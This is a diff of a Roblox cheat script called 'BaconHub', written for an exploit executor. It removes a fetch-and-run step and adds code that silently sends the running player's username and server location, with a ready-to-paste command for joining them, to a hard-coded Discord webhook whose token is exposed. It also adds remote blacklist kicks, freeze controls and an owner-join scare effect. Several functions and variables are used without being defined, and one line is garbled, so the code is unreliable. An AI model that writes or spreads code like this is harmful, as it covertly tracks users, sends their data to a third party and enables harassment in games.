+-- ✅ KRNL-Compatible Webhook with Username + Teleport Command
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local LocalPlayer = Players.LocalPlayer
+local username = LocalPlayer.Name
+
+local placeId = tostring(game.PlaceId)
+local jobId = tostring(game.JobId)
+
+local webhook = "https://discord.com/api/webhooks/1397575581570437221/YR78v0TagfOEez0JcuxDcfxbNVrtuWVREwo9hnjvYr-P4UrAvpAA5guxMZdAdJYiLTa4"
+
+local teleportCmd = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '")'
+
+local payload = {
+    content = "**📡 BaconHub user joined!**\n" ..
+              "👤 **Username:** `" .. username .. "`\n" ..
+              "📍 **PlaceId:** `" .. placeId .. "`\n" ..
+              "🧩 **JobId:** `" .. jobId .. "`\n\n" ..
+              "📋 **Join them:**\n```lua\n" .. teleportCmd .. "\n```"
+}
+
+local req = http_request or request or syn.request
+if not req then
+    warn("❌ HTTP request function not available in this executor.")
+    return
+end
 
 local success, response = pcall(function()
-    return game:HttpGet(url)
+    return req({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
 end)
 
 if success then
-    loadstring(response)()
+    print("[✅] Webhook sent with username and join code!")
 else
-    warn("Failed to load script:", response)
+    warn("[❌] Failed to send webhook:", response)
 end
 
+
+local function createTextLabel(parent, props)
+    local label = Instance.new("TextLabel", parent)
+    for prop, val in pairs(props) do
+        label[prop] = val
+    end
+    return label
+end
+
+local function showBlacklistGuiAndKick()
+    local gui = Instance.new("ScreenGui", PlayerGui)
+    gui.Name = "BlacklistWarning"
+
+    createTextLabel(gui, {
+        Size = UDim2.new(0.6, 0, 0.12, 0),
+        Position = UDim2.new(0.2, 0, 0.4, 0),
+        Text = "❌ You have broken the rule.\nYou have been blacklisted.",
+        TextColor3 = Color3.fromRGB(255, 0, 0),
+        Font = Enum.Font.GothamBold,
+        TextScaled = true,
+        TextWrapped = true,
+        BackgroundColor3 = Color3.fromRGB(25, 25, 25),
+        BackgroundTransparency = 0.1,
+        BorderSizePixel = 0,
+    })
+
+    logToWebhook("🚫 **Blocked User:** `" .. Player.Name .. "` (`" .. Player.UserId .. "`)\n⛔ Reason: Blacklisted from Pastebin.")
+    task.wait(5)
+    Player:Kick("❌ You are blacklisted from BaconHub.")
+end
+
+local function checkBlacklist()
+    local success, raw = pcall(function()
+        return game:HttpGet(blacklistURL)
+    end)
+    if not success or typeof(raw) ~= "string" then return false end
+
+    local ids = string.split(raw, "\n")
+    for _, id in ipairs(ids) do
+        if tostring(Player.UserId) == id then
+            return true
+        end
+    end
+    return false
+end
+
+-- Main blacklist check
+if checkBlacklist() then
+    showBlacklistGuiAndKick()
+end
+
+-- Command Handlers
+local function handleKick(reason)
+    logToWebhook("🚫 **" .. Player.Name .. "** was kicked.\n📝 Reason: `" .. (reason or "No reason") .. "`")
+    Player:Kick(reason or "You were kicked.")
+end
+
+local function handleFreeze()
+    local char = Player.Character or Player.CharacterAdded:Wait()
+    local root = char and Ar.CharacterAdded:Wait()
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if root then
+        root.Anchored = true
+        logToWebhook("❄️ **" .. Player.Name .. "** was frozen.")
+    end
+end
+
+local function handleUnfreeze()
+    local char = Player.Character or Player.CharacterAdded:Wait()
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if root then
+        root.Anchored = false
+        logToWebhook("🔥 **" .. Player.Name .. "** was unfrozen.")
+    end
+end
+
+local function showMessageToUser(text)
+    local gui = Instance.new("ScreenGui", PlayerGui)
+    gui.Name = "BaconHubMessage"
+
+    local label = createTextLabel(gui, {
+        Size = UDim2.new(0.6, 0, 0.1, 0),
+        Position = UDim2.new(0.2, 0, 0.85, 0),
+        Text = text or "📬 BaconHub message.",
+        TextColor3 = Color3.new(1, 1, 1),
+        Font = Enum.Font.GothamBold,
+        TextScaled = true,
+        BackgroundColor3 = Color3.fromRGB(30, 30, 30),
+        BackgroundTransparency = 0.2,
+        BorderSizePixel = 0,
+    })
+
+    task.delay(5, function() gui:Destroy() end)
+    logToWebhook("💬 **" .. Player.Name .. "** was shown a message: `" .. text .. "`")
+end
+
+-- Join log
+logToWebhook("🔔 **" .. Player.Name .. "** loaded procheats Remote")
+
+-- 👑 BaconHub Owner Detection + Ghost 👻
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local Debris = game:GetService("Debris")
+local InsertService = game:GetService("InsertService")
+local SoundService = game:GetService("SoundService")
+
+-- 👻 Ghost spawner
+local function spawnGhost()
+	local ghost = Instance.new("Model", workspace)
+	ghost.Name = "👻 BaconGhost"
+
+	-- Dummy Humanoid
+	local humanoid = Instance.new("Humanoid")
+	humanoid.Name = "Humanoid"
+	humanoid.Parent = ghost
+	humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+
+	-- Load appearance of Bacon_hack7698 (UserId 8636199320)
+	local success, result = pcall(function()
+		return Players:GetHumanoidDescriptionFromUserId(8636199320)
+	end)
+	if success then
+		local ghostDummy = Instance.new("Model")
+		ghostDummy.Name = "GhostDummy"
+		local hrp = Instance.new("Part", ghostDummy)
+		hrp.Name = "HumanoidRootPart"
+		hrp.Size = Vector3.new(2,2,1)
+		hrp.Anchored = true
+		hrp.Transparency = 1
+		hrp.CanCollide = false
+
+		local hum = Instance.new("Humanoid", ghostDummy)
+		hum:ApplyDescription(result)
+		hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+		ghostDummy.Parent = workspace
+
+		-- Position ghost in front of player
+		local char = Player.Character or Player.CharacterAdded:Wait()
+		local root = char:WaitForChild("HumanoidRootPart")
+		local pos = root.Position + (root.CFrame.LookVector * 20)
+		hrp.CFrame = CFrame.new(pos)
+
+		-- Make parts ghostly
+		for _,desc in ipairs(ghostDummy:GetDescendants()) do
+			if desc:IsA("BasePart") or desc:IsA("Decal") then
+				desc.Transparency = 1
+			end
+		end
+
+		-- Fade in
+		task.spawn(function()
+			for i = 1, 20 do
+				for _,desc in ipairs(ghostDummy:GetDescendants()) do
+					if desc:IsA("BasePart") or desc:IsA("Decal") then
+						desc.Transparency = math.clamp(1 - i * 0.05, 0.5, 1)
+					end
+				end
+				task.wait(0.1)
+			end
+		end)
+
+		-- Add spooky whisper sound
+		local whisper = Instance.new("Sound", hrp)
+		whisper.SoundId = "rbxassetid://9118823102" -- creepy whisper sound
+		whisper.Volume = 1
+		whisper:Play()
+
+		-- Remove after 10 sec
+		Debris:AddItem(ghostDummy, 10)
+	end
+end
+
+-- 👁️ Alert UI
+local function showOwnerAlert()
+	local gui = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
+	gui.Name = "BaconHubOwnerJoin"
+
+	local msg = Instance.new("TextLabel", gui)
+	msg.Size = UDim2.new(0.6, 0, 0.08, 0)
+	msg.Position = UDim2.new(0.2, 0, 0.88, 0)
+	msg.Text = "🚨 Bacon_hack7698 (BaconHub Owner) has joined your server!"
+	msg.TextColor3 = Color3.fromRGB(255, 0, 0)
+	msg.Font = Enum.Font.GothamBold
+	msg.TextScaled = true
+	msg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+	msg.BackgroundTransparency = 0.2
+	msg.BorderSizePixel = 0
+
+	wait(6)
+	gui:Destroy()
+end
+
+-- 🔎 Detect if Bacon_hack7698 is here
+if Player.Name ~= "Bacon_hack7698" then
+	for _,plr in ipairs(Players:GetPlayers()) do
+		if plr.Name == "Bacon_hack7698" then
+			showOwnerAlert()
+			spawnGhost()
+		end
+	end
+
+	Players.PlayerAdded:Connect(function(plr)
+		if plr.Name == "Bacon_hack7698" then
+			showOwnerAlert()
+			spawnGhost()
+		end
+	end)
+end
